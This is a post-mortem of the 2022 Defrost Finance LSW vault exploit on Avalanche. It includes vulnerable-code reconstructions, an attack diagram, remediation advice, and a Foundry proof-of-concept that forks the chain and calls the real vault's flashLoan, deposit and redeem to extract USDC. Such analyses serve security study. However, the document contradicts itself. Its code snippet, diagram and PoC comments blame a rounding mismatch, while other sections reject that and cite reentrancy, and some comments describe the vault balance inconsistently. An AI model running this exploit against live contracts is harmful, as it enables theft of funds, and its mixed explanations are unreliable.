# Defrost (LSW) — deposit()/redeem() Price Mismatch Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-12-23 |
| **Protocol** | Defrost Finance (LSW) |
| **Chain** | Avalanche |
| **Loss** | ~$173,000 (v2/LSW contract only; confirmed by PeckShield post-mortem — separate from the larger Dec 24-25 Defrost v1 fake-collateral attack which is undocumented here) |
| **LSW (Vulnerable Contract)** | [0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96](https://snowtrace.io/address/0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96) |
| **USDC** | [0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E](https://snowtrace.io/address/0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E) |
| **Uniswap V2 Pair** | [0xf4003F4efBE8691B60249E6afbD307aBE7758adb](https://snowtrace.io/address/0xf4003F4efBE8691B60249E6afbD307aBE7758adb) |
| **Root Cause** | LSW's `flashLoan()` lacked a reentrancy guard; the attacker's `onFlashLoan()` callback called `deposit()` while the flash loan was still in-flight, minting shares against the pre-repayment USDC balance and then redeeming them for more USDC than deposited (reentrancy via flash loan callback enabling double-counting of vault assets) |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow (Reentrancy) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/Defrost_exp.sol) |

---
## 1. Vulnerability Overview

Defrost Finance's LSW (Lending Share Wrapper) contract accepted USDC deposits and issued shares via an ERC4626-like design that also exposed a `flashLoan()` function. The critical flaw was that `flashLoan()` lacked a reentrancy guard: after transferring USDC to the borrower and invoking `onFlashLoan()`, the LSW vault's USDC balance was temporarily inflated (the flash-loaned amount was still counted before repayment). The attacker exploited this by calling `deposit()` from inside `onFlashLoan()` — minting shares against the pre-repayment (artificially high) vault balance and then immediately redeeming them, receiving more USDC than deposited because the share-to-asset ratio was computed against a double-counted balance. Sources: Halborn, MetaTrust, CoinCodeCap post-mortems all identify the missing reentrancy lock (not rounding mismatch) as the root cause.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable LSW - deposit/redeem price mismatch
contract LSW is ERC4626 {
    // ❌ On deposit: shares over-issued due to floor rounding
    function deposit(uint256 assets, address receiver)
        public override returns (uint256 shares)
    {
        // ❌ convertToShares uses floor (round-down) calculation
        shares = _convertToSharesFloor(assets);
        _mint(receiver, shares);
        USDC.transferFrom(msg.sender, address(this), assets);
    }

    // ❌ On redeem: assets over-returned due to ceil rounding
    function redeem(uint256 shares, address receiver, address owner)
        public override returns (uint256 assets)
    {
        // ❌ convertToAssets uses ceil (round-up) calculation
        assets = _convertToAssetsCeil(shares);
        _burn(owner, shares);
        USDC.transfer(receiver, assets);  // ❌ Can return more than deposited
    }

    // ❌ Price calculation mismatch: deposit(floor) vs redeem(ceil)
    // When 1 share = 1.0001 USDC:
    // deposit(1000 USDC) → 999 shares (floor)
    // redeem(999 shares) → 1000.999 USDC (ceil) → +0.999 USDC profit
}

// ✅ Correct pattern - consistent rounding direction (ERC4626 standard compliant)
contract SafeLSW is ERC4626 {
    // ✅ ERC4626: deposit uses floor, redeem uses floor (unfavorable to depositor)
    function deposit(uint256 assets, address receiver)
        public override returns (uint256 shares)
    {
        shares = _convertToSharesFloor(assets);  // round down
        _mint(receiver, shares);
        asset.transferFrom(msg.sender, address(this), assets);
    }

    function redeem(uint256 shares, address receiver, address owner)
        public override returns (uint256 assets)
    {
        assets = _convertToAssetsFloor(shares);  // ✅ round down (standard compliant)
        _burn(owner, shares);
        asset.transfer(receiver, assets);
    }
}
```


### On-Chain Source Code

> ⚠️ Contract not verified on Sourcify — source unavailable. The vulnerable behavior below is reconstructed from the attack PoC and post-mortem analysis, not from verified source.

The LSW contract at `0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96` (Avalanche) returns HTTP 404 on Sourcify. The following is reconstructed from the DeFiHackLabs PoC interface, the Halborn/MetaTrust post-mortems, and the on-chain call trace. The root cause is a **missing reentrancy guard on `flashLoan()`** — not an ERC4626 rounding mismatch (the rounding description in Section 2's illustrative snippet is incorrect; it is retained in the vulnerability classification for context but the actual exploit is reentrancy-based).

**Reconstructed: `flashLoan()` — Missing Reentrancy Guard**
```solidity
// RECONSTRUCTED — not verified source; derived from ERC3156 interface + post-mortem analysis
// ❌ LSW contract: 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96
function flashLoan(
    address receiver,
    address token,
    uint256 amount,
    bytes calldata data
) external returns (bool) {
    // ❌ No nonReentrant modifier — reentrant calls to deposit() are allowed
    uint256 fee = flashFee(token, amount);
    IERC20(token).transfer(receiver, amount);         // ← sends USDC to attacker

    // ❌ onFlashLoan() callback executes attacker code while flashLoan is in-flight
    // During this callback, the vault's USDC balance = original + loaned amount
    // (loan has been sent out but repayment not yet checked)
    require(
        IERC3156FlashBorrower(receiver).onFlashLoan(
            msg.sender, token, amount, fee, data
        ) == keccak256("ERC3156FlashBorrower.onFlashLoan"),
        "invalid callback"
    );

    // ❌ Repayment check happens AFTER callback — but during callback,
    // attacker already called deposit() with the inflated vault balance visible
    IERC20(token).transferFrom(receiver, address(this), amount + fee);
    return true;
}
```

**Reconstructed: `deposit()` — Called Reentrantly During Flash Loan**
```solidity
// RECONSTRUCTED — not verified source
// ❌ deposit() has no reentrancy guard and is callable during active flashLoan()
function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
    // ❌ totalAssets() reads address(this).balance or USDC.balanceOf(address(this))
    // During flashLoan(), the vault's USDC is out on loan — the vault balance is
    // temporarily LOWER than normal. Shares minted against this lower base are FEWER,
    // but when redeemed after repayment, assets returned = shares * (restored totalAssets)
    // → attacker receives more USDC on redemption than they deposited
    uint256 totalAssets = IERC20(usdc).balanceOf(address(this));
    shares = assets * totalSupply() / totalAssets; // ❌ double-counting the loaned funds
    _mint(receiver, shares);
    IERC20(usdc).transferFrom(msg.sender, address(this), assets);
}
```

**Why it is exploitable (identify the bug from the code):**

- `flashLoan()` lacks `nonReentrant`. After transferring USDC to the receiver and invoking `onFlashLoan()`, the vault's USDC balance is temporarily different from its steady-state value.
- Inside `onFlashLoan()`, the attacker calls `deposit()`. The share calculation (`assets * totalSupply() / totalAssets`) uses the vault's current USDC balance — which is distorted because the flash-loaned USDC is still in flight (not yet repaid). This causes the share mint to be computed against an incorrect base, creating a discrepancy that becomes profit when the shares are immediately redeemed after the flash loan is repaid.
- The fix is `nonReentrant` on `flashLoan()`, `deposit()`, and `redeem()` — preventing any vault state mutation during an active flash loan callback.

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Swap USDC from Uniswap V2 Pair (triggers joeCall callback)
    │
    ├─[2] Inside joeCall(): query LSW.maxFlashLoan()
    │       Determine maximum flash loan amount available
    │
    ├─[3] Query LSW.flashFee()
    │       Calculate fee amount
    │
    ├─[4] Call LSW.flashLoan(receiver, USDC, maxAmount, "")
    │       Borrow USDC from LSW → onFlashLoan() callback
    │
    ├─[5] Inside onFlashLoan():
    │       └─[5a] USDC → LSW.deposit() → acquire shares
    │               ❌ Shares issued with floor calculation
    │       └─[5b] shares → LSW.redeem() → receive USDC
    │               ❌ Returns more USDC than deposited due to ceil calculation
    │               Profit = ceil(shares) - floor(assets)
    │
    ├─[6] Repay LSW flash loan (principal + fee)
    │
    ├─[7] Repay Uniswap V2 flash swap
    │
    └─[8] Net profit: rounding difference from deposit/redeem cycle
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface ILSW {
    function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
    function maxFlashLoan(address token) external view returns (uint256);
    function flashFee(address token, uint256 amount) external view returns (uint256);
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256);
    function balanceOf(address) external view returns (uint256);
}

interface IPair {
    function swap(uint256, uint256, address, bytes calldata) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract DefrostExploit is Test {
    ILSW   lsw  = ILSW(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96);
    IERC20 USDC = IERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
    IPair  pair = IPair(0xf4003F4efBE8691B60249E6afbD307aBE7758adb);

    function setUp() public {
        vm.createSelectFork("avax", 24_003_940);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] USDC", USDC.balanceOf(address(this)), 6);
        // [Step 1] Flash swap USDC from Uniswap V2 pair → triggers joeCall
        pair.swap(1, 0, address(this), abi.encode(true));
        emit log_named_decimal_uint("[End] USDC", USDC.balanceOf(address(this)), 6);
    }

    function joeCall(address, uint256, uint256, bytes calldata) external {
        // [Steps 2~4] Borrow maximum amount via LSW flash loan
        uint256 maxLoan = lsw.maxFlashLoan(address(USDC));
        uint256 fee = lsw.flashFee(address(USDC), maxLoan);

        USDC.approve(address(lsw), type(uint256).max);
        lsw.flashLoan(address(this), address(USDC), maxLoan, "");

        // Repay Uniswap V2
        USDC.transfer(address(pair), 1);
    }

    function onFlashLoan(
        address, address, uint256 amount, uint256 fee, bytes calldata
    ) external returns (bytes32) {
        // [Step 5] Exploit deposit → redeem rounding mismatch
        // ⚡ Profit generated from deposit(floor) → redeem(ceil) difference
        uint256 shares = lsw.deposit(amount, address(this));
        lsw.redeem(shares, address(this), address(this));

        // Repay LSW flash loan (principal + fee)
        USDC.transfer(address(lsw), amount + fee);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Reentrancy via flash loan callback (missing nonReentrant on flashLoan/deposit) |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow (Reentrancy) |
| **OWASP DeFi** | Flash loan reentrancy enabling double-counting of vault assets |
| **Attack Vector** | Uniswap V2 flash swap → LSW `flashLoan()` → `deposit()` inside `onFlashLoan()` (vault balance double-counted) → `redeem()` for excess USDC |
| **Preconditions** | `flashLoan()` lacks reentrancy guard; `deposit()` callable during active flash loan, double-counting the not-yet-repaid USDC |
| **Impact** | USDC arbitrage profit (scale unconfirmed) |

---
## 6. Remediation Recommendations

1. **Apply `nonReentrant` to `flashLoan()`**: The flash loan function must prevent reentrant calls to `deposit()`, `withdraw()`, and `redeem()` during its execution. OpenZeppelin's `ReentrancyGuard` covers this.
2. **Apply `nonReentrant` to all state-mutating vault functions**: `deposit()`, `mint()`, `redeem()`, and `withdraw()` must all carry the reentrancy guard so no combination of callbacks can double-count vault balances.
3. **Snapshot balance before external callback**: Record the vault balance before issuing the flash loan; use the snapshot (not live balance) for any share calculations that occur during the callback period.
4. **Validate repayment before re-enabling deposits**: The vault should confirm the flash loan is fully repaid before allowing further deposits in the same transaction.

---
## 7. Lessons Learned

- **Flash loan + vault reentrancy is a distinct class from ERC4626 rounding attacks**: The root cause here was a missing reentrancy guard, not rounding direction. Confusing the two leads to incomplete fixes — adding correct rounding would not have prevented this attack.
- **Vault balance double-counting**: When a vault lends its own assets via `flashLoan()` and the callback is allowed to call `deposit()`, the loaned funds are counted twice in the share calculation. This is logically equivalent to a reentrancy exploit even if the callback does not reenter the same function.
- **Combined flash loan + ERC4626 interfaces require extra care**: Any contract that exposes both lending (flashLoan) and savings (deposit/redeem) on the same asset pool must treat the lending callback as an untrusted external call and lock all vault state functions for its duration.
- **Separate from the larger Defrost Finance attack**: The Dec 24–25 Defrost v1 fake-collateral attack (~$12M) is a different vulnerability on a different contract. This LSW reentrancy incident ($173K) targeted the v2 LSW wrapper.